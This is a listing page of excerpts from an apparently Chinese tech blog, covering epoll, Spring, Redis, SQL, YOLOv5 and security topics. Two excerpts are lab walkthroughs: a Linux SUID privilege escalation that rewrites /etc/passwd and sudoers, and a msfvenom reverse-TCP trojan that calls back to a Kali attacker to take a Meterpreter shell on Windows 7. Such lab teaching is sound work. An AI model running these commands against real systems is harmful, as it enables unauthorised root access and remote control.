ET模式 对于读事件 EPOLLIN，只有socket上的数据从无到有，EPOLLIN 才会触发；对于写事件 EPOLLOUT，只有在socket写缓冲区从不可写变为可写，EPOLLOUT 才会触发（刚刚添加事件完成调用epoll_wait时或者缓冲区从满到不满）
这种模式听起来清爽了很多，只有状态变化时才会通知，通知的次数少了自然也会引发一些问题，比如触发读事件后必须把数据收取干净，因为你不一定有下一次机会再收取数据了，即使不采用一次读取干净的方式，也要把这个激活状态记下来，后续接着处理，否则如果数据残留到下一次消息来到时就会造成延迟现象。
这种模式下写事件触发后，后续就不会再触发了，如果还需要下一次的写事件触发来驱动发送数据，就需要再次注册一次检测可写事件。
数据的读取和发送 关于数据的读比较好理解，无论是LT模式还是ET模式，监听到读事件从socket开始读数据就好了，只不过读的逻辑有些差异，LT模式下，读事件触发后，可以按需收取想要的字节数，不用把本次接收到的数据收取干净，ET模式下，读事件触发后通常需要数据一次性收取干净。
而数据的写不太容易理解，因为数据的读是对端发来数据导致的，而数据的写其实是自己的逻辑层触发的，所以在通过网络发数据时通常都不会去注册监可写事件，一般都是调用 send 或者 write 函数直接发送，如果发送过程中， 函数返回 -1，并且错误码是 EWOULDBLOCK 表明发送失败，此时才会注册监听可写事件，并将剩余的服务存入自定义的发送缓冲区中，等可写事件触发后再接着将发送缓冲区中剩余的数据发送出去。
代码实践 基础代码 以下为一个epoll触发模式测试的基础代码，也不算太长，直接拿来就可以测试：
#include &lt;sys/socket.h&gt; //for socket #include &lt;arpa/inet.h&gt; //for htonl htons #include &lt;sys/epoll.h&gt; //for epoll_ctl #include &lt;unistd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22a53ae36d2f9c2586414cf285faa8ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a993b87ce1b28f57b0f23cbc8a31c65e/" rel="bookmark">
			Spring IoC(控制反转)和DI(依赖注入)的理解，非常通俗易懂
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载：谈谈对Spring IOC的理解 - 孤傲苍狼 - 博客园 (cnblogs.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b02daa44d8f01e0d95b22880f4c79bb/" rel="bookmark">
			Linux提权之SUID提权
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux提权之SUID提权 SUID提权 1. SUID权限只能设置二进制文件 2. 命令执行者要有二进制文件的执行权 3. 命令执行者执行二进制文件时会获得该程序的属主身份 4. SUID权限只在程序执行中有效 即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限 cp命令提权 以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会由rwx变成rws
也可以通过find / -perm -u=s -type f 2&gt;dev/null命令来查找拥有SUID权限的程序
perm指定权限，-u=s代表SUID权限，type指定文件类型，f表示常规文件
当用户用cp命令时，此时的权限为root，利用时，可以cp把/etc/passwd复制到自己的家目录下，然后用vim进行修改。
首先用openssl生成一个密码，openssl passwd -1 -salt 1*2*3 abcdpasswd参数代表生成一个密码，-1为md5,-salt指定盐(随意),最后要跟加密的值，也就是密码。(当前用户也可执行openssl命令)
把/etc/passwd文件复制到自己当前位置进行修改
使用vim命令编辑passwd文件，保存时使用wq!进行强制保存
在最底部添加这么一行，用户(可以自己添加，我的为abc,密码为openssl生成的密码)其余不变，然后强制保存
再使用cp ./passwd /etc/passwd把修改的放回去，然后进行查看，发现已经添加
最后使用su abc再输入密码abcd就可以是root用户身份了
发现提权成功
SUID find指令提权 1. find命令在拥有SUID权限的情况下，也可以进行提权 2. 只需要使用exec参数即可 3. find的exec参数用来指定其它命令，以便于来处理搜到的结果，结果的输出，需要以分号结束，在bash环境中分号代表块结束，有特殊意义，所以这里必须转义。 SUID vim指令提权 1. vim在拥有SUID权限以后也可以进行提权操作 2. 当vim被赋予suid权限后，意味着任何用户都可以使用vim命令来编辑哪些只能由root编辑的文件，例如通过vim来编辑/etc/sudoers文件 (普通用户会被直接拒绝访问)，在sudoers文件中配置普通用户的权限，权限和root一样，这里以test用户为例添加如下内容: test ALL=(ALL:ALL) ALL 3. vim编辑后保存时使用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读 vim /etc/sudoers需要创建一个test用户根据原有的形式修改，修改后强制保存
执行sudo bash会获取一个root的shell
提权成功
除了一些系统可执行命令，自己写的可执行文件也可添加SUID权限，无论是何种语言，都可以进行提权。
其余命令参考链接 https://gtfobins.github.io
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90d707ef3fb16db4b09e4c8337eb56c1/" rel="bookmark">
			高并发之缓存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Web缓存是用于临时存储（缓存）Web文档（如HTML页面和图像），以减少服务器延迟的一种信息技术。Web缓存系统会保存下通过这套系统的文档的副本；如果满足某些条件，则可以由缓存满足后续请求。
缓存的作用 减少网络带宽消耗：当Web缓存副本被使用时，只会产生极小的网络流量，可以有效的降低运营成本。
降低服务器压力：给网络资源设定有效期之后，用户可以重复使用本地的缓存，减少对源服务器的请求，间接降低服务器的压力。同时，搜索引擎的爬虫机器人也能根据过期机制降低爬取的频率，也能有效降低服务器的压力。
减少网络延迟，加快页面打开速度：带宽对于个人网站运营者来说是十分重要，缓存的使用能够明显加快页面打开速度，达到更好的体验。
web缓存有哪些？ 数据库缓存：避免频繁的数据库查询，将查询的数据放入内存中，下次从内存中直接返回。
服务器缓存：服务器缓存一些经常会被用的资源，当多个用户访问时，因为他们共同需要访问的资源已经被缓存了，可以有效降低服务器压力。
浏览器缓存：缓存一些最近用到的图片，数据，页面等，提高网页打开速度。
缓存特征 缓存的特征
命中率 = 命中数 / (命中数+ 没有命中数)
命中率越高 , 说明使用缓存的收益越好 , 应用性能越好, 响应的时间越短 , 吞吐量越高 ,抗并发的能力越强
最大元素(空间)
代表缓存中可以存放的最大元素的数量 , 一旦缓存中元素的数量超过最大空间 ,是指缓存数据所在空间超过最大支持的空间, 将会触发清空策略 . 根据不同的场景合理的设置最大元素值, 可以在一定程度上提高缓存的命中率, 从而更有效的使用缓存 .
redis持久化策略 首先，redis支持RDB（默认）和AOF两种持久化策略。
a) RDB：Redis Database。RDB是Redis默认的持久化方式。每隔必定的时间周期就将内存的数据以快照的形式保存到硬盘中，对应产生的数据文件为dump.rdb。经过配置文件中的save参数能够设置生成快照的时间周期。
RDB的优缺点：
1 2 3 4 5 6 7 8 优势： 1、只有一个文件dump.rdb，方便持久化； 2、容灾性好，一个文件能够保存到安全的磁盘； 3、性能最大化。使用单独子进程来进行持久化，主进程不会进行任何IO操做，保证了redis的高性能； 4、相对于数据集大时，比AOF的启动效率更高 缺点： 1、数据安全性低。由于RDB是间隔一段时间进行持久化，若是持久化之间redis发生故障，会发生数据丢失。 b) AOF：Append Only File。将Redis每次执行的写命令记录到单独的日志文件中，当重启Redis时，会从持久化的日志文件中从新恢复数据。
当两种方式同时开启时，数据恢复Redis会优先选择AOF恢复。
AOF优缺点：
1 2 3 4 5 6 7 8 优势： 1、数据安全，AOF持久化能够令属性appendfsync为always，表示将每一次的命令操做记录到AOF文件中； 2、以append模式写文件，即便中途服务器宕机，能够经过redis-check-aof工具解决数据一致性问题。 3、AOF机制的rewrite模式，在AOF文件还没被rewrite以前（当文件过大时，会对文件中的命令进行合并重写），能够删除其中的一些命令。 缺点： 1、AOF文件比RDB文件大，且恢复速度慢。 2、数据集大的时候，比RDB启动效率低。 c) 对RDB和AOF二者进行对比：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90d707ef3fb16db4b09e4c8337eb56c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7867e975c252666fad2fe3395a2bdee4/" rel="bookmark">
			Vue3动态引入图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		技术方案 Vue3+Composition API
场景 在子组件中需要将父组件传入的图片路径赋给img标签，对图片进行显示。为便于子组件复用，图片路径需动态传入，不可在子组件中写死。
问题 若在setup函数中直接return imgSrcUrl，并在template img标签中引入的话，会导致无法显示图片即找不到文件所在路径，与webpack打包静态资源的方式有关系。
&lt;template&gt; &lt;div&gt; &lt;img :src="userImgSrc"&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: 'Profile', props: { }, setup(props, context) { let userImgSrc = '../../assets/images/test.jpg'; return { userImgSrc } }, } &lt;/script&gt; 解决方案 按照下述方式，使用require将图片导入，但需注意，require中需对路径进行拼接，不可直接传入变量，否则无法解析。
错误示例： let url = '../../assets/mages/test.jpg'; let userImgSrc = require(url); 正确完整示例： &lt;template&gt; &lt;div&gt; &lt;img :src="userImgSrc"&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: 'Profile', props: { }, setup(props, context) { let url = 'images/test.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7867e975c252666fad2fe3395a2bdee4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b64267a4358bf71f2f9cdbb16a9eb18/" rel="bookmark">
			对于数据库能查询到的数据但是java里却显示null的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：对于数据库能查询到的数据但是java里却显示null
解决方案：
① 很有可能是你设置的属性为 private ，然后没有给相对应的get和set方法 才导致无法获取对应的属性，然后显示为null;
未修改前：
class Human{ private Integer id; public Human(Integer id) { this.id = id; } } 修改后：
class Human{ private Integer id; public Human(Integer id) { this.id = id; } public Integer getId() { return id; } public void setId(Integer id) { this.id = id; } } ② 可能是对应字段没有设置相对应，Bean对应类和数据库的对应类顺序名称类型要相一致，不得随意进行更改。
常见类型:
mysql ======== java
int ======== Ingeter
char,varchar ======== String
仅供参考...
2022-04-04
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af03d6eb1600b6d4c88d92a0f4d203aa/" rel="bookmark">
			SQL语句编写规范
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		书写风格
1. 语句关键字应全部使用小写。
2. 引用字符时应使用单引号。如：update testable set idcol=’abcd’。
3. 连接符或运算符or、in、and、＝、&lt;=、&gt;=， +，- 等前后宜加上一个空格。否则容易导致以下类似问题。例如在语句select a–b from table中，a，b均为变量，拼写该语句时，如果a = 6，b = -3，则语句变为select 6--3 from table。--被视为SQL的注释，结果语句报错。
4. 不得使用“select * from …”语法，必须标明字段名。即select col1, col2,… from tablea where …
5. 严禁使用“insert into table_name values (?,?,……)”语法，统一使用“insert into table_name (col1,col2,……) values (?,?,…...)”。
6. SQL语句包含多表连接时，必须加上表的别名，对每个字段的使用都要带上表别名。即 select a.col1, a.col2, b.col3 from tablea a, tableb b where a.col4=b.col5
7. 应避免显式或隐含的类型转换。例如在where子句中numeric型和int型的列的比较。
8. 在子查询中前后必须加上括号。select col1, col2 from tablea where col3 in ( select col4 from tableb where col4&gt;0)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af03d6eb1600b6d4c88d92a0f4d203aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79580d894cbede74d8c38055631ac91a/" rel="bookmark">
			MYSOL数据库-创建、修改表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MYSQL数据库操作语言 – DDL（数据定义语言)
– DML （数据操作语言）
用于操作数据库对象中所包含的数据
INSERT、UPDATE、DELETE 用于 给表添加 删除 修改数据
– DQL（数据查询语言）
用于查询数据库数据 SELECT 查询数据
– DCL（数据控制语言）
用来管理数据库的语言，包括管理权限及数据更改
– GRANT、COMMIT、ROLLBACK
软件：navicat 运行sql
选中语句ctrl+shift+R DDL（数据定义语言) : 定义和管理数据对象，如数据库，数据表等
CREATE 创建数据库 创建表DROP 删除表 删除数据库ALTER 添加约束 删除约束 CREATE 创建数据库 语法:
CREATE DATABASE [IF NOT EXISTS] 数据库名; 案例演示：
1、
CREATE DATABASE IF NOT EXISTS myschool; -- IF NOT EXISTS 判断 myschool 数据库是否不存在 2、
CREATE DATABASE myschool; ---- ;表示语句结束 DROP 删除数据库 语法：
DROP DATABASE [IF EXISTS] 数据库名; 案例演示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79580d894cbede74d8c38055631ac91a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a47f45fbd49df703c063c3ff506dc40/" rel="bookmark">
			不同阶QAM调制星座图中，符号能量的归一化计算原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、归一化能量计算原理二、Matlab中如何得到归一化能量符号总结 前言 在基于QAM调制的matlab仿真程序中，我们通常会产生二进制比特流，并最终映射成QAM符号，该符号大都是格雷编码的。在坐标系中，相邻符号之间的横纵坐标值一般相差为2，那么用这个星座图仿真是不是正确的呢？
一、归一化能量计算原理 我们大都是对4QAM符号，也就是QPSK符号的归一化很熟悉，至少我之前是这样认为的，并且一瞬间就能想到它的归一化能量之后的符号的值。也就是对每一个QPSK符号
例如：1+1i
都除以 2 \sqrt{2} 2 ​,之前认为是 1 2 + 1 2 \sqrt{1^2+1^2} 12+12 ​这样计算的，而且大都时候，我们都是可以直接使用matlab中qammod函数中的“UnitAveragePower”参数，直接得到归一化能量的QAM符号。但是掌握并理解星座图中QAM符号的归一化能量计算，对于不同阶数QAM之间的联系，会有更深刻的理解。
那么，QPSK符号的归一化能量是怎么计算的呢？
因为QPSK四种符号出现的概率都为 1 4 \frac{1}{4} 41​,每个符号的能量为 1 2 + 1 2 = 2 {1^2+1^2}=2 12+12=2，所以每个符号的平均符号能量为 E s m a v e = 1 4 × ( 2 + 2 + 2 + 2 ) = 2 Esm_ave = \frac{1}{4} \times (2+2+2+2)=2 Esma​ve=41​×(2+2+2+2)=2，那么为了将该能量归一化为1，则每个符号的平均能量除以2，那么对于每个符号的横纵坐标（幅值与相位）就是除以 2 \sqrt{2} 2 ​,所以最终的归一化能量QPSK符号为：
0.707 + 0.707i
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a47f45fbd49df703c063c3ff506dc40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3ec5b025c46828f089827b6553e5a2d/" rel="bookmark">
			最长不下降子序列的O(nlogn)算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0.总结 Get to the key point firstly, the article comes from LawsonAbs!
本文主要讲的知识点有：什么是 LNDS？如何以 O(n^2^)的复杂度求出 LNDS【longest non descending subsequence】？如何以O（NlogN）的复杂度求出 LNDS？ 1.问题 给出一串序列，求出该序列中最长的不下降（即非严格递增顺序）的子序列长度。
2.分析 在使用DP之前，需要记住的是，是否满足如下两个特性：
最优子结构重叠子问题 2.1 最优子结构 如果一个数列A是数列B的最长上升子序列，那么相应的在数列A和数列B中去掉数列A中的某个数字之后，A剩下的序列肯定也是B剩下序列中最长的子序列 （或之一） 。
举例如下：
5 B:1 4 3 5 7 A: 1 4 5 7(最长上升子序列) 去掉数字7之后，数列A,B相应的变成如下的样子：
B: 1 4 3 5 A: 1 4 5 可以看到子序列A仍然是序列B的最长子序列
或者如下例：
5 1 4 3 5 2 (A: 1 4 5) (B: 1 4 3 5 2) 去掉数字5之后，数列A和数列B相应的变成如下样子：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3ec5b025c46828f089827b6553e5a2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f571f82dec34fd13c93476f78063812a/" rel="bookmark">
			第一节:Keras深度学习框架之环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		请在学习本节前阅读我们之前的预热课程：
卷积神经网络的框架解读(上)_BBM的开源HUB的博客-CSDN博客
卷积神经网络的框架解读（下）_BBM的开源HUB的博客-CSDN博客
从本节开始，我们将进入到Keras的详细介绍和代码精读，为开始我们的Keras之行，我们首先要搭建一个学习平台。现在让我们开始吧。
一：环境准备
1、安装anaconda
下载地址：Anaconda | Individual Edition
根据需要，下载你需要版本，如果你是windows操作系统就下载：“64-Bit Graphical Installer ”，如果你是linux就下载：64-Bit (x86) Installer，下载完后，安装anaconda。
Windows平台
双击安装文件Anaconda3-2021.11-Windows-x86_64.exe开始安装，注意在这里要全部选上：
注意安装文件的文件名，可以在不同时期会因为版本号的不同有变化，大家可灵活安装
Linux平台
bash Anaconda3-2021.11-Linux-x86_64.sh linux平台在阅读授权文件后，就是一路yes，安装完后，重启电脑。
2、创建工作环境
conda create -n keras python=3.8 3、进入工作环境
conda activate keras 4、安装tensorflow
电脑仅有CPU的安装这个
conda install tensorflow 电脑有GPU的安装这个
conda install tensorflow-gpu 其他关联包的安装
conda install tensorboard 安装keras
conda install keras 二：安装编译环境
我们这里介绍使用jupyter，主要原因是代码量比较小，同时在做深度学习的时候可以对每一行代码进行调试，所以这里我们使用jupyter搭建编译环境。
conda install nb_conda 启动jupyter
jupyter notebook &amp; 启动后的界面如下：
在New处创建一个新的notebook，如下图：
三：安装环境的验证及keras初体验
1、在第一行，我们导入keras输入：
import keras 2、导入模型,我们以序惯模型为例
from keras.models import Sequential 3、定义模型对象
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f571f82dec34fd13c93476f78063812a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a9a56656d4b46da58ec93fe8d563c1c/" rel="bookmark">
			【YOLOV5-5.x 源码解读】common.py
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言0、导入需要的包和基本配置1、基本组件1.1、autopad1.2、Conv1.3、Focus1.4、Bottleneck1.5、BottleneckCSP1.6、C31.7、SPP1.8、Concat1.9、Contract、Expand 2、注意力模块2.1、transformer自注意力模块2.2、SE注意力模块2.3、CBAM注意力模块2.4、CA注意力模块 3、模型扩展模块3.1、NMS3.2、AutoShape3.3、Detections3.4、Classify 总结Reference 前言 源码： YOLOv5源码.
导航: 【YOLOV5-5.x 源码讲解】整体项目文件导航.
注释版全部项目文件已上传至GitHub: yolov5-5.x-annotations.
这个模块存放着yolov5网络搭建常见Common模块。
yolov5s网络结构图：
0、导入需要的包和基本配置 import math # 数学函数模块 from copy import copy # 数据拷贝模块 分浅拷贝和深拷贝 from pathlib import Path # Path将str转换为Path对象 使字符串路径易于操作的模块 import numpy as np # numpy数组操作模块 import pandas as pd # panda数组操作模块 import requests # Python的HTTP客户端库 import torch # pytorch深度学习框架 import torch.nn as nn # 专门为神经网络设计的模块化接口 from PIL import Image # 图像基础操作模块 from torch.cuda import amp # 混合精度训练模块 from utils.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a9a56656d4b46da58ec93fe8d563c1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/333de7d945179efb8251f9d70ff27520/" rel="bookmark">
			木马攻击获得Windows7的权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		讲Windows常见攻击手段就不可以不讲它，因为它是Windows常见攻击手段里必不可少的一员。他就是木马攻击，首先先说一下他的概述：它是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。木马病毒其实是计算机黑客用于远程控制计算机的程序，将控制程序寄生于被控制的计算机系统中，里应外合，对被感染木马病毒的计算机实施操作。一般的木马病毒程序主要是寻找计算机后门，伺机窃取被控计算机中的密码和重要文件等。可以对被控计算机实施监控、资料修改等非法操作。木马病毒具有很强的隐蔽性，可以根据黑客意图突然发起攻击。
以上就是，对木马的介绍。下面开始进行实验：
首先搭建实验环境：一台攻击机：kali，一台靶机:win7
攻击机kali IP：192.168.220.148
靶机win7 IP：192.168.220.154
然后配置实验环境，将win7的Windows防火墙界面打开，并把它关闭。因为这个会影响实验的结果，所以建议关闭。然后在win7上ping kali查看是否能ping通。再在kali 上ping win7 也查看是否ping通。目的是查看两台机子网络是否联通。查看结果是可以联通。
先制作一个木马，在kali中使用软件msfvenom制作输入命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.220.148 （攻击机IP）lport=4444（攻击机端口） -f exe &gt; /root/qq.exe（后面是文件路径）。接着输入cp qq.exe /var/www/html命令，将木马程序复制到/var/www/html文件夹下，输入命令cd /var/www/html 进入文件夹下目录输入ls命令查看有没有多余的文件，发现有 index.html index.nginxdebian.html QQ.exe三个多余的文件，马上删除否则影响实验。于是输入命令了rm -v index.html index.nginx-debian.html QQ.exe（删除多余文件）。然后输入/etc/init.d/apache2 start命令（启动Apache）接着输入命令/etc/init.d/apache2 status（查看Apache进程）。
下面开始攻击在kali中输入命令msfconsole，启动msfconsole接着输入命令use exploit/multi/handler（开始监听），输入命令：setpayloadwindows/meterpreter/reverse_tcp（反弹监听端），输入命令set LHOST 192.168.220.148（是可以反弹到这台机子上），输入命令set LPORT 4444（监听端口号）输入命令show options查看攻击模块，输入命令run开始攻击。攻击完成得到meterpreter，输入命令shell提权，接着输入命令chcp 437为了可以避免乱码，然后输入ipconfig验证实验结果（下面的图是依次而截）
预防木马病毒有以下3点方法：
1、不要浏览危险网站。比如一些黑客，色情网站，本身就是很危险的，其中隐匿着许多病毒与木马，用手机浏览此类网站是非常危险的。
2、保证下载的安全性。网上有许多资源提供电脑下载，然而很多病毒就隐藏在这些资源中，这就要求用户在使用电脑下载各种资源的时候确保下载站点是否安全可靠，尽量避免去个人网站下载。
3、不要打开陌生的QQ邮件请求。陌生的QQ邮件可能带有病毒，收到此类陌生的QQ邮件后立即删除，以免感染木马病毒。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2b7f408af624e69b209fc4e61c9181d/" rel="bookmark">
			CVE-2022-22947-Spring Cloud Gateway RCE漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 0x01 漏洞背景 近日，Spring官方发布了关于Spring Cloud Gateway的CVE报告，其中包含Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）。
Gateway是在Spring生态系统之上构建的API网关服务，基于Spring 5，Spring Boot 2和 Project Reactor等技术。Gateway旨在提供一种简单而有效的方式来对API进行路由，以及提供一些强大的过滤器功能， 例如：熔断、限流、重试等。
Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）发生在Spring Cloud Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可通过该漏洞恶意创建允许在远程主机上执行任意远程执行的请求。
0x02 风险等级 严重
0x03 影响版本 已知受影响应用及组件：
1
2
3
Spring Cloud Gateway 3.1.0
Spring Cloud Gateway 3.0.0至3.0.6
Spring Cloud Gateway 3.0.0之前的版本
0x04 修复建议 1、升级版本解决
3.1.x用户应升级到3.1.1+
3.0.x用户应升级到3.0.7+
2、禁用服务解决
如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用
如果必须需要Actuator端点，则应使用Spring Security对其进行保护
0x05 参考链接 1、https://www.safedog.cn/news.html?id=5071
2、CVE-2022-22947-Spring Cloud Gateway RCE漏洞 |棉花哥的博客|Cotton's Blog 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c42770bd3b3fea26118b5f5a6608bbd7/" rel="bookmark">
			东航建设漏洞管理平台的探索实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、法律法规下的漏洞管理要求 漏洞是网络攻防的战略性资源。
近年美国颁布了一系列有关漏洞披露管理的相关规定和法案，其对漏洞的披露管理十分严格谨慎。不难看出，美国早已将漏洞视为网络军火进行挖掘收集和严格管控。作为在漏洞管理链条中扮演重要角色的网络安全企业，也应利用自身安全技术和人才优势，在漏洞的挖掘、修复和处置中发挥更加重要的作用，提高国家和社会网络安全防护水平。
1.1 国内法规要求 目前国内存在的部分关于漏洞的管理规定：
2019年6月1日：工信部《网络安全漏洞管理规定（征求意见稿）》已更新
2021年7月12日：工信部、国家互联网信息办公室、公安部《网络产品安全漏洞管理规定》 2021年9月1日起施行
2013年12月31日：国标 |《GB/T 30276-2013 信息安全技术 信息安全漏洞管理规范》已作废
2020年11月19日：国标 |《GB∕T 30276-2020 信息安全技术 网络安全漏洞管理规范》
1.1.1 《网络产品安全漏洞管理规定》出台的目的和意义是什么？
主要目的是维护国家网络安全，保护网络产品和重要网络系统的安全稳定运行；规范漏洞发现、报告、修补和发布等行为，明确网络产品提供者、网络运营者、以及从事漏洞发现、收集、发布等活动的组织或个人等各类主体的责任和义务；鼓励各类主体发挥各自技术和机制优势开展漏洞发现、收集、发布等相关工作。《规定》的出台将推动网络产品安全漏洞管理工作的制度化、规范化、法治化，提高相关主体漏洞管理水平，引导建设规范有序、充满活力的漏洞收集和发布渠道，防范网络安全重大风险，保障国家网络安全。
1.1.2 全国信息安全标准化技术委员会《GB∕T 30276-2020 信息安全技术 网络安全漏洞管理规范》的职责
网络安全漏洞管理流程各阶段（包括漏洞发现和报告、接收、验证、处置、发布、跟踪等）的管理流程、管理要求以及证实方法。
1.2 《网络产品安全漏洞管理规定》解读 分为三类管理对象，对于企业来说就是网络运营者：
1.2.1 《网络产品安全漏洞管理规定》确认了两类主体责任
不管是网络产品提供者还是网络运营者，应当建立健全网络产品安全漏洞信息接收渠道并保持畅通，且留存漏洞接收日志不少于6个月。
网络产品提供者：
接收：应当建立健全网络安全产品安全漏洞信息接收渠道并保持畅通，留存漏洞接收日志不少于6个月。
发现或者获知所提供网络产品存在安全漏洞后：
验证：应当立即采取措施并组织对安全漏洞进行验证评估，应当立即通知上游相关产品的提供者。
报送：应当2日内向工信部网络安全威胁和漏洞信息共享平台报送相关漏洞信息。
修补：应当及时组织对漏洞进行修补，应当及时将漏洞风险及修补方式告知可能受影响的产品用户，并提供必要的技术支持。
网络运营者：
接收：应当建立健全网络产品安全漏洞信息接收渠道并保持畅通，留存漏洞接收日志不少于6个月。
修补：发现或者获知其网络、信息系统及其设备存在安全漏洞后，应当立即采取措施，及时对安全漏洞进行验证并完成修补。
1.2.2 《网络产品安全漏洞管理规定》鼓励企业自行建立安全漏洞奖励机制
规定的：
第六条：鼓励相关组织和个人向网络产品提供者通报其产品存在的安全漏洞。
第七条：鼓励网络产品提供者建立所提供网络产品安全漏洞奖励机制，对发现并通报所提供网络产品安全漏洞的组织或者个人给予奖励。
影响：
白帽子是我国互联网行业中一股不可忽视的技术力量，目前大部分网络安全产品提供者都有自己的安全应急响应部门（SRC），这些公司部门每年会有漏洞提交者的奖励大会，相等于悬赏外部“白帽”，帮助其提升产品的安全性。而本次发布的《规定》则从政策法规层面进一步明确了网络漏洞规范化管理，规范了网络产品漏洞的处理和生命周期流程，禁止利用漏洞从事不法活动。
《规定》也鼓励了安全生态圈内各主体发挥自身优势，动员企业和社会组织自建漏洞管理平台并规范化地参与和开展漏洞的发现、收集、发布等相关工作。
规定的发布对从事漏洞平台运营和漏洞全生命周期管理平台研发的企业，也会产生积极的影响。
1.2.3 《网络产品安全漏洞管理规定》发布要求
（一）不得在网络产品提供者提供网络产品安全漏洞修补措施之前发布漏洞信息；认为有必要提前发布的，应当与相关网络产品提供者共同评估协商，并向工业和信息化部、公安部报告，由工业和信息化部、公安部组织评估后进行发布。
（二）不得发布网络运营者在用的网络、信息系统及其设备存在安全漏洞的细节情况。
（三）不得刻意夸大网络产品安全漏洞的危害和风险，不得利用网络产品安全漏洞信息实施恶意炒作或者进行诈骗、敲诈勒索等违法犯罪活动。
（四）不得发布或者提供专门用于利用网络产品安全漏洞从事危害网络安全活动的程序和工具。
（五）在发布网络产品安全漏洞时，应当同步发布修补或者防范措施。
（六）在国家举办重大活动期间，未经公安部同意，不得擅自发布网络产品安全漏洞信息。
（七）不得将未公开的网络产品安全漏洞信息向网络产品提供者之外的境外组织或者个人提供。
（八）法律法规的其他相关规定。
1.2.4 《网络产品安全漏洞管理规定》漏洞收集平台要求
（一）从事网络产品安全漏洞发现、收集的组织，应当加强内部管理，采取措施防范网络产品安全漏洞信息泄露和违规发布行为。
（二）网络产品安全漏洞收集平台需要向工信部备案，工信部及时向公安部、国家互联网信息办公室通报后，在将备案通过的漏洞收集平台予以公布。
（三）鼓励机构的安全漏洞收集平向四大平台：工信部网络安全威胁和漏洞信息共享平台、国家网络与信息安全信息通报中心漏洞平台、国家计算机网络应急技术处理协调中心漏洞平台、中国信息安全测评中心漏洞库报送网络产品安全漏洞信息。
1.2.5《网络产品安全漏洞管理规定》相关处罚
（一）网络产品提供者未按本规定采取网络产品安全漏洞补救或者报告措施的，由工业和信息化部、公安部依据各自职责依法处理。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c42770bd3b3fea26118b5f5a6608bbd7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9cd7407c8ab48e10714cc88d42096e6/" rel="bookmark">
			simulink和GUI实时通信
			</a>
		</h2>
		
	</header>
